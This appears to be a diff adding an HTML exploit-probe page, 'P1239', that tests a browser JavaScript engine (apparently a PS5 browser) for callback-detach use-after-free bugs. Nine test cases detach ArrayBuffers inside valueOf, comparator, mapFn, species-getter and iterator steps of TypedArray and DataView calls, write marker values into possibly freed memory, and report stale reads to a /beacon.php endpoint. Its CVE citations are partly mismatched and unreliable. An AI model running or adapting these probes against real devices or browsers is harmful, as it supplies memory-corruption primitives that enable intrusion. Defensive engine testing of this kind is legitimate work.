@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1239</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<!--
+  P1239: Callback-Detach Exploitation Patterns
+
+  CONCEPT: During a multi-step TypedArray/DataView operation, if a user-provided
+  callback (valueOf, comparator, mapFn, toJSON) detaches the underlying ArrayBuffer,
+  the operation may continue reading/writing through a stale pointer.
+
+  This is a REAL exploit class — CVE-2024-36971, CVE-2023-32435, etc.
+
+  Tests:
+  A. TypedArray.set(array, offset) where offset.valueOf() detaches
+  B. TypedArray.sort(comparator) where comparator detaches
+  C. TypedArray.copyWithin(target, start) where target.valueOf() detaches
+  D. DataView.getInt32(offset) where offset.valueOf() detaches
+  E. Array.from(typedArray, mapFn) where mapFn detaches
+  F. TypedArray.fill(value, start, end) where value.valueOf() detaches
+  G. TypedArray.slice() with species constructor that detaches
+  H. TypedArray[Symbol.iterator] with detach between next() calls
+-->
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1239-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+
+log('=== P1239: CALLBACK-DETACH EXPLOITATION ===');
+log('Time: '+new Date().toISOString());
+B('START','P1239-callback-detach');
+
+// Helper: detach a buffer via structuredClone transfer
+function detachBuffer(buf) {
+  try {
+    structuredClone(buf, {transfer: [buf]});
+    return true;
+  } catch(e) {
+    return false;
+  }
+}
+
+// Helper: create a filled buffer
+function makeBuf(size, fillByte) {
+  var buf = new ArrayBuffer(size);
+  var v = new Uint8Array(buf);
+  for(var i=0;i<size;i++) v[i] = fillByte;
+  return buf;
+}
+
+// Helper: check if buffer contents have unexpected values
+function scanBuf(view, expected, label) {
+  var anomalies = 0;
+  var samples = [];
+  for(var i=0;i<view.length;i++){
+    var v = view[i];
+    if(v !== expected && v !== 0 && v !== undefined) {
+      anomalies++;
+      if(samples.length < 5) samples.push(i+':0x'+v.toString(16));
+    }
+  }
+  return {anomalies: anomalies, samples: samples};
+}
+</script>
+
+<!-- ============================================================ -->
+<!-- A: TypedArray.set(array, offset) — offset.valueOf detaches   -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- A: TypedArray.set() with valueOf detach ---');
+
+var aResult = 'unknown';
+try {
+  var buf = makeBuf(1024, 0xAA);
+  var target = new Uint8Array(buf);
+  var source = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
+
+  // Evil offset object — detaches buffer during set()
+  var evilOffset = {
+    valueOf: function() {
+      log('A: valueOf called! Detaching buffer...');
+      detachBuffer(buf);
+      log('A: Buffer detached! byteLength='+buf.byteLength);
+      return 0; // Write at offset 0
+    }
+  };
+
+  log('A: Before set: target[0]=0x'+target[0].toString(16)+' bufLen='+buf.byteLength);
+
+  try {
+    target.set(source, evilOffset);
+    // If we get here, the set completed!
+    log('A: set() completed without error!');
+    log('A: After set: target[0]='+target[0]+' bufLen='+buf.byteLength);
+
+    // Check what was actually written
+    var scan = scanBuf(target, 0xAA, 'A');
+    aResult = 'SET_OK|anomalies='+scan.anomalies+'|samples='+scan.samples.join(',');
+    log('A: Scan: '+scan.anomalies+' anomalies');
+  } catch(e) {
+    aResult = 'set_threw:'+e.message;
+    log('A: set() threw: '+e.message);
+  }
+
+  // Check buffer state
+  aResult += '|bufLen='+buf.byteLength;
+} catch(e) {
+  aResult = 'outer_error:'+e.message;
+}
+B('A-result', aResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- B: TypedArray.sort(comparator) — comparator detaches         -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- B: TypedArray.sort() with comparator detach ---');
+
+var bResult = 'unknown';
+try {
+  var buf = makeBuf(256, 0);
+  var arr = new Uint8Array(buf);
+  // Fill with descending values so sort has work to do
+  for(var i=0;i<256;i++) arr[i] = 255 - i;
+
+  var callCount = 0;
+  var detached = false;
+
+  try {
+    arr.sort(function(a, b) {
+      callCount++;
+      if(callCount === 10 && !detached) {
+        log('B: Detaching at comparator call #10!');
+        detached = detachBuffer(buf);
+        log('B: Detach result='+detached+' bufLen='+buf.byteLength);
+      }
+      return a - b;
+    });
+    log('B: sort() completed! calls='+callCount);
+    bResult = 'SORT_OK|calls='+callCount+'|detached='+detached;
+
+    // Check what's in the array
+    var first5 = [];
+    for(var i=0;i<5;i++) first5.push(arr[i]);
+    bResult += '|first5='+first5.join(',');
+    log('B: First 5: '+first5.join(','));
+  } catch(e) {
+    bResult = 'sort_threw:'+e.message+'|calls='+callCount;
+    log('B: sort() threw after '+callCount+' calls: '+e.message);
+  }
+
+  bResult += '|bufLen='+buf.byteLength;
+} catch(e) {
+  bResult = 'outer_error:'+e.message;
+}
+B('B-result', bResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- C: TypedArray.copyWithin — target.valueOf detaches           -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- C: copyWithin with valueOf detach ---');
+
+var cResult = 'unknown';
+try {
+  var buf = makeBuf(256, 0);
+  var arr = new Uint8Array(buf);
+  for(var i=0;i<256;i++) arr[i] = i;
+
+  var evilTarget = {
+    valueOf: function() {
+      log('C: valueOf for target! Detaching...');
+      detachBuffer(buf);
+      return 128; // Copy to offset 128
+    }
+  };
+
+  try {
+    arr.copyWithin(evilTarget, 0, 64); // Copy bytes 0-63 to offset 128
+    log('C: copyWithin completed!');
+    cResult = 'COPY_OK|bufLen='+buf.byteLength;
+
+    var first5 = [];
+    for(var i=128;i<133;i++) first5.push(arr[i]);
+    cResult += '|copied='+first5.join(',');
+  } catch(e) {
+    cResult = 'threw:'+e.message;
+    log('C: copyWithin threw: '+e.message);
+  }
+
+  cResult += '|bufLen='+buf.byteLength;
+} catch(e) {
+  cResult = 'outer_error:'+e.message;
+}
+B('C-result', cResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- D: DataView.getInt32 — offset.valueOf detaches               -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- D: DataView.getInt32 with valueOf detach ---');
+
+var dResult = 'unknown';
+try {
+  var buf = makeBuf(256, 0xDD);
+  var dv = new DataView(buf);
+
+  var evilOffset = {
+    valueOf: function() {
+      log('D: valueOf! Detaching buffer...');
+      detachBuffer(buf);
+      return 0;
+    }
+  };
+
+  // Test multiple DataView operations
+  var tests = [];
+
+  // getInt32
+  try {
+    var val = dv.getInt32(evilOffset);
+    tests.push('getInt32=0x'+val.toString(16));
+    log('D: getInt32 after detach = 0x'+val.toString(16));
+  } catch(e) {
+    tests.push('getInt32='+e.message);
+    log('D: getInt32 threw: '+e.message);
+  }
+
+  // Try getBigUint64 (confirmed available on PS5!)
+  var buf2 = makeBuf(256, 0xEE);
+  var dv2 = new DataView(buf2);
+  var evilOff2 = {
+    valueOf: function() {
+      detachBuffer(buf2);
+      return 0;
+    }
+  };
+  try {
+    var bigVal = dv2.getBigUint64(evilOff2);
+    tests.push('getBigUint64='+bigVal.toString(16));
+    log('D: getBigUint64 after detach = 0x'+bigVal.toString(16));
+  } catch(e) {
+    tests.push('getBigUint64='+e.message.slice(0,60));
+    log('D: getBigUint64 threw: '+e.message);
+  }
+
+  // setInt32 with valueOf detach
+  var buf3 = makeBuf(256, 0x00);
+  var dv3 = new DataView(buf3);
+  var evilOff3 = {
+    valueOf: function() {
+      detachBuffer(buf3);
+      return 0;
+    }
+  };
+  try {
+    dv3.setInt32(evilOff3, 0xDEADBEEF);
+    tests.push('setInt32=OK');
+    log('D: setInt32 after detach = OK (wrote to freed memory?)');
+
+    // Check if anything was written
+    var check = new DataView(new ArrayBuffer(4));
+    tests.push('bufLen='+buf3.byteLength);
+  } catch(e) {
+    tests.push('setInt32='+e.message.slice(0,60));
+    log('D: setInt32 threw: '+e.message);
+  }
+
+  // setInt32 where VALUE.valueOf detaches
+  var buf4 = makeBuf(256, 0x00);
+  var dv4 = new DataView(buf4);
+  var evilVal = {
+    valueOf: function() {
+      detachBuffer(buf4);
+      return 0x41414141;
+    }
+  };
+  try {
+    dv4.setInt32(0, evilVal);
+    tests.push('setVal=OK_wrote');
+    log('D: setInt32 value-detach = OK (wrote 0x41414141 to freed?)');
+  } catch(e) {
+    tests.push('setVal='+e.message.slice(0,60));
+    log('D: setInt32 value-detach threw: '+e.message);
+  }
+
+  dResult = tests.join('|');
+} catch(e) {
+  dResult = 'outer:'+e.message;
+}
+B('D-result', dResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- E: Array.from(typedArray, mapFn) — mapFn detaches           -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- E: Array.from() with mapFn detach ---');
+
+var eResult = 'unknown';
+try {
+  var buf = makeBuf(64, 0);
+  var src = new Uint8Array(buf);
+  for(var i=0;i<64;i++) src[i] = i + 1;
+
+  var mapCount = 0;
+  var detached = false;
+
+  try {
+    var result = Array.from(src, function(val, idx) {
+      mapCount++;
+      if(mapCount === 8 && !detached) {
+        log('E: mapFn #8 — detaching!');
+        detached = detachBuffer(buf);
+      }
+      return val;
+    });
+
+    log('E: Array.from completed! length='+result.length+' mapCalls='+mapCount);
+
+    // Check for non-zero values after detach point
+    var postDetach = [];
+    for(var i=7;i<Math.min(15,result.length);i++){
+      postDetach.push(result[i]);
+    }
+    eResult = 'OK|len='+result.length+'|maps='+mapCount+'|post='+postDetach.join(',');
+    log('E: Post-detach values: '+postDetach.join(','));
+
+    // Any non-zero post-detach values = stale read!
+    var staleCount = 0;
+    for(var i=8;i<result.length;i++){
+      if(result[i] !== 0 && result[i] !== undefined) staleCount++;
+    }
+    eResult += '|stale='+staleCount;
+    if(staleCount > 0) log('E: *** '+staleCount+' STALE READS! ***');
+  } catch(e) {
+    eResult = 'threw:'+e.message+'|maps='+mapCount;
+    log('E: Array.from threw: '+e.message);
+  }
+} catch(e) {
+  eResult = 'outer:'+e.message;
+}
+B('E-result', eResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- F: TypedArray.fill() — value.valueOf detaches                -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- F: TypedArray.fill() with valueOf detach ---');
+
+var fResult = 'unknown';
+try {
+  var buf = makeBuf(256, 0xAA);
+  var arr = new Uint8Array(buf);
+
+  var evilValue = {
+    valueOf: function() {
+      log('F: valueOf! Detaching...');
+      detachBuffer(buf);
+      return 0x42;
+    }
+  };
+
+  try {
+    arr.fill(evilValue); // fill with 0x42 after detach
+    log('F: fill() completed!');
+
+    // If fill wrote to freed memory, arr contents are 0x42 or crash
+    var check = [];
+    for(var i=0;i<5;i++) check.push(arr[i]);
+    fResult = 'FILL_OK|bufLen='+buf.byteLength+'|first5='+check.join(',');
+    log('F: After fill: '+check.join(','));
+  } catch(e) {
+    fResult = 'threw:'+e.message;
+    log('F: fill() threw: '+e.message);
+  }
+} catch(e) {
+  fResult = 'outer:'+e.message;
+}
+B('F-result', fResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- G: TypedArray.slice — Symbol.species constructor detaches    -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- G: TypedArray.slice with species ---');
+
+var gResult = 'unknown';
+try {
+  var buf = makeBuf(256, 0);
+  var arr = new Uint8Array(buf);
+  for(var i=0;i<256;i++) arr[i] = i;
+
+  // Try to override Symbol.species (may not work on TypedArrays)
+  var speciesHit = false;
+  try {
+    // TypedArray species is usually locked down, but test it
+    Object.defineProperty(arr.constructor, Symbol.species, {
+      get: function() {
+        log('G: Species getter called! Detaching...');
+        speciesHit = true;
+        detachBuffer(buf);
+        return Uint8Array;
+      }
+    });
+
+    var sliced = arr.slice(0, 16);
+    log('G: slice completed! species='+speciesHit+' sliceLen='+sliced.length);
+
+    var vals = [];
+    for(var i=0;i<Math.min(8,sliced.length);i++) vals.push(sliced[i]);
+    gResult = 'SLICE_OK|species='+speciesHit+'|len='+sliced.length+'|vals='+vals.join(',');
+  } catch(e) {
+    gResult = 'threw:'+e.message+'|species='+speciesHit;
+    log('G: slice threw: '+e.message);
+  }
+} catch(e) {
+  gResult = 'outer:'+e.message;
+}
+B('G-result', gResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- H: Iterator with mid-iteration detach                        -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- H: Iterator with mid-iteration detach ---');
+
+var hResult = 'unknown';
+try {
+  var buf = makeBuf(64, 0);
+  var arr = new Uint8Array(buf);
+  for(var i=0;i<64;i++) arr[i] = i + 1;
+
+  var iter = arr[Symbol.iterator]();
+  var values = [];
+  var detachPoint = -1;
+
+  for(var i=0;i<64;i++){
+    if(i === 8) {
+      log('H: Detaching at iteration 8');
+      detachBuffer(buf);
+      detachPoint = i;
+    }
+
+    try {
+      var next = iter.next();
+      if(next.done) break;
+      values.push(next.value);
+    } catch(e) {
+      hResult = 'iter_threw_at_'+i+':'+e.message;
+      log('H: Iterator threw at '+i+': '+e.message);
+      break;
+    }
+  }
+
+  if(hResult === 'unknown') {
+    log('H: Got '+values.length+' values');
+
+    // Post-detach values
+    var postVals = values.slice(8, 16);
+    log('H: Pre-detach[0-7]: '+values.slice(0,8).join(','));
+    log('H: Post-detach[8-15]: '+postVals.join(','));
+
+    // Any non-zero post-detach = stale read!
+    var stale = 0;
+    for(var i=8;i<values.length;i++){
+      if(values[i] !== 0 && values[i] !== undefined) stale++;
+    }
+    hResult = 'OK|total='+values.length+'|stale='+stale+'|post8='+postVals.join(',');
+    if(stale > 0) log('H: *** '+stale+' STALE ITERATOR READS! ***');
+  }
+} catch(e) {
+  hResult = 'outer:'+e.message;
+}
+B('H-result', hResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- I: BONUS — String.fromCharCode.apply with detach             -->
+<!-- ============================================================ -->
+
+<script>
+log('\n--- I: String.fromCharCode with detach ---');
+
+var iResult = 'unknown';
+try {
+  var buf = makeBuf(64, 0);
+  var arr = new Uint16Array(buf);
+  for(var i=0;i<32;i++) arr[i] = 65 + i; // A, B, C, ...
+
+  // Convert to regular array with detach mid-way
+  var mapped = [];
+  for(var i=0;i<32;i++){
+    if(i === 8) detachBuffer(buf);
+    mapped.push(arr[i]);
+  }
+
+  var str = '';
+  try {
+    str = String.fromCharCode.apply(null, mapped);
+  } catch(e) {
+    str = 'threw:'+e.message;
+  }
+
+  log('I: String result length='+str.length);
+  log('I: Pre-detach: "'+str.slice(0,8)+'"');
+  log('I: Post-detach: "'+str.slice(8,16)+'"');
+
+  // Check for non-NUL characters after detach (stale reads)
+  var staleChars = 0;
+  for(var i=8;i<str.length;i++){
+    if(str.charCodeAt(i) !== 0) staleChars++;
+  }
+  iResult = 'len='+str.length+'|pre='+str.slice(0,8)+'|staleChars='+staleChars;
+  if(staleChars > 0) log('I: *** '+staleChars+' STALE STRING CHARS! ***');
+} catch(e) {
+  iResult = 'outer:'+e.message;
+}
+B('I-result', iResult);
+</script>
+
+<!-- ============================================================ -->
+<!-- FINAL SUMMARY                                                -->
+<!-- ============================================================ -->
+
+<script>
+log('\n=== P1239 FINAL SUMMARY ===');
+B('DONE','all');
+log('\n=== P1239 COMPLETE ===');
+</script>
+
+</body>
+</html>
